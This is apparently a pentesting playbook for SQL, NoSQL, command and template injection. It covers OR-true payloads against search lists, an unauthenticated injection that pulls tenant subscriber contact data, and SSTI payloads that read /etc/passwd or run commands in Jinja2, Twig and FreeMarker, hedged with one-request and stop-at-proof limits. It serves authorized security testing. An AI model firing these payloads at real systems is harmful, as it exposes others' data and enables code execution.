> For the on-site checklist, see `dig-scope` §4.2.1: test every filter parameter when changes in count / content are observable; mark the whole area N/A only if it returns “Please log in.” Choose probes for the stack (JSON/Mongo operators, ES search boxes, Java HQL/SpEL, SSTI where templates exist; for SQL, continue using quote / boolean / timing tests). After a 405, try a different parameter location, not only a different encoding.
> Search by heading for “List filter OR + total” and “Email-subscription iframe same-directory list” in the quick matrix. WooYun statistics / sqlmap --os-shell / reverse-shell material / English appendices were removed; adapt to the live stack instead of relying on a tutorial.

# Injection Testing Guide (SQL injection / command injection / SSTI)

## SQL injection

### List filter OR + total (ES / search results)

Lists of enterprise transactions, purchases, or employees often filter on `employeeName` / name / keyword and return `total` / `totalNum` / `totalSize`; the back end is often ES or a search system that runs SQL-like queries.

**This probe is risky.** On transaction lists / ES, `or (1)=(1)` can remove tenant and date filters and match the entire database. A response total in the hundreds of millions is possible; one query can saturate the cluster, overwhelm the list, and expose another company’s transactions. Stop once **the total changes sharply and the first result is clearly not yours**.

1. First enter a string that does not exist; the response should be empty or contain only a few results.
2. Then try a false boolean: `')and (1)=(2)--`; results should still be empty (this proves logic can be changed without yet opening the whole database).
3. Only then try a true condition: `1')or (1)=(1)--+A` (if `1=1` is blocked, use `(1)=(1)`). **Send only one request.** Check only total; keep pageSize at 1–5.
4. It is confirmed only if the count rises from empty / single digits to hundreds of thousands / millions / hundreds of millions, and the first result is a transaction for **another employee / company**. Stop proof at that point.
5. **These limits apply to this OR-true probe of the full ES / transaction dataset:** do not repeat / replay the payload, maximize pageSize, click next page / export, use sqlmap `--dump` / `--risk=3`, or target a delete / update endpoint. Crashing the cluster is not proof.
6. False positive, do not report, if fuzzy search treats `or` as a keyword or all added results are already readable within your own company role. If ES accepts only Query DSL and treats the SQL as plain text, switch to DSL / `$where` rather than persisting with SQL.

This is an opening probe, not the only permitted test, and it does **not** prohibit all data extraction through injection. Adapt UNION / timing / error-based / WAF-encoding / other injection points to the observed stack; prefer timing over OR-true when it is safer.

### Email-subscription iframe same-directory list (quick-matrix pointer)

Recognize: an email-subscription form is embedded in an iframe; the same-directory list endpoint treats `key` as authorization and concatenates it into SQL. Common patterns include a subscription form shell / `alertform.../main/index.php?id=tenant`.

Test without logging in:

1. Copy the tenant ID from the iframe
2. Request same-directory `GET /main/list.php?key=`
3. The `key` is concatenated into SQL as authorization. Try `1' OR client_id=tenant LIMIT 1#` (one request only)

Confirmed when the response contains subscriber names / email addresses / phone numbers for that tenant. Wrong Key / an empty array are controls.

False positives: no list.php exists; `key` is checked as a constant or with a prepared statement. Do not remove this quick-matrix entry because one site did not match. Do not launch a broad FOFA search for similar-looking customers.

### Quick checks

Single quote / boolean true-false / timing. After a 405, try query / JSON / header / path. For this OR+total probe, **do not** use sqlmap `--dump` / `--os-shell`.

### JSON / Mongo operators (select by stack; do not spray quotes at every path)

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`. Do not treat the login form as an ordinary business parameter. Confirm only with another party’s data or a stable response difference.

## Command injection

Common inputs: filename / ip / ping / conversion / diagnostics page. Probes: `;id` / `|id` / `$(id)` / timing with `sleep 5`. Disprove the issue safely; do not use a local reverse shell as a tutorial.

## SSTI (server-side template injection)

### Detection payload

```
{{7*7}}          → A return value of 49 indicates SSTI
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### Common framework checks

```python
# Jinja2 (Python/Flask)
{{config}}                           # Information disclosure
{{''.__class__.__mro__[2].__subclasses__()}}  # Enumerate classes
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---
